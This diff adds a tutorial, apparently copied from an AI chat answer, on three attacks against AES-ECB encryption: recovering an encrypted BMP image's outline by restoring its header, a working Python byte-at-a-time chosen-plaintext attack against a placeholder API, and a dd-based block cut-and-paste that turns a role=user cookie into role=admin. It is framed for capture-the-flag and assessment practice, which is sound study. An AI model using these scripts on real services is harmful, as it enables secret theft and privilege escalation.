@@ -1,1 +1,81 @@
 
+🖼️ Method 1: Visual Leak Analysis (For Encrypted Images)
+
+If a BMP or PPM image is encrypted with AES-ECB, you can reveal the hidden image from the command line without decrypting it, simply by restoring the image header files.
+
+Step 1: Extract the encrypted pixel data
+
+Assume encrypted.ecb is the raw AES-ECB encrypted image file.
+bash
+# Keep a copy of a valid header from an unencrypted image
+head -c 54 original.bmp > visual_leak.bmp
+Use code with caution.
+
+Step 2: Append the encrypted blocks
+
+Append the raw ciphertext to the valid image header. Because ECB preserves patterns, opening the output file will visibly show the outlines of the original image.
+bash
+tail -c +55 encrypted.ecb >> visual_leak.bmp
+Use code with caution.
+Open visual_leak.bmp in any image viewer to read the leaked shape.
+
+🐍 Method 2: Automated Byte-at-a-Time Decryption (Python script)
+
+In CTF challenges or API assessments, a server might append a secret flag to your input string before encrypting it using AES-ECB: AES-ECB(Your_Input + Secret_Flag).
+You can perform a Byte-at-a-Time chosen-plaintext attack entirely via Python from your command prompt to leak the secret byte-by-byte.
+python
+import requests # Requires 'pip install requests'
+
+def oracle(payload):
+    # Simulates sending a payload to a vulnerable ECB network server
+    # The server appends the secret flag and returns hex-encoded ECB ciphertext
+    url = "http://vulnerable-api.local"
+    r = requests.get(url, params={"input": payload.hex()})
+    return bytes.fromhex(r.json()["ciphertext"])
+
+# Automated cracking engine
+block_size = 16
+secret = b""
+
+# Dynamically discover the flag length loop
+for _ in range(64):
+    length = len(secret)
+    # Pad input to isolate exactly one unknown byte at the block boundary
+    padding = b"A" * (block_size - 1 - (length % block_size))
+    target_block_end = (((length // block_size) + 1) * block_size)
+    
+    # Get the target ciphertext block matching our payload length
+    target_output = oracle(padding)[:target_block_end]
+    
+    # Brute-force guess the next single byte (256 possibilities)
+    for byte_guess in range(256):
+        test_payload = padding + secret + bytes([byte_guess])
+        test_output = oracle(test_payload)[:target_block_end]
+        
+        if test_output == target_output:
+            secret += bytes([byte_guess])
+            print(f"Leaked string so far: {secret.decode(errors='ignore')}")
+            break
+Use code with caution.
+
+🐧 Method 3: Block Replay / Cutting and Pasting (Linux/macOS)
+
+If an ECB-encrypted profile cookie looks like this: email=admin@site.com&role=user, and the block size is 16 bytes, you can swap block placements using command line tools like dd.
+
+Step 1: View the hex distribution of your cookie blocks
+
+bash
+echo -n "USER_COOKIE_HEX_STRING" | xxd -r -p | xxd -g 16
+Use code with caution.
+
+Step 2: Swap authorization blocks
+
+If you crafts an input that forces the word role=admin to perfectly line up on its own 16-byte boundary, you can extract that single block using dd and overwrite the role=user block in your actual profile session token:
+bash
+# Extract the 16-byte 'admin' block from a crafted payload file
+dd if=crafted_payload.bin of=admin_block.bin bs=16 skip=2 count=1
+
+# Inject that block into your normal session cookie file at the correct offset
+dd if=admin_block.bin of=my_cookie.bin bs=16 seek=1 conv=notrunc
+Use code with caution.
+
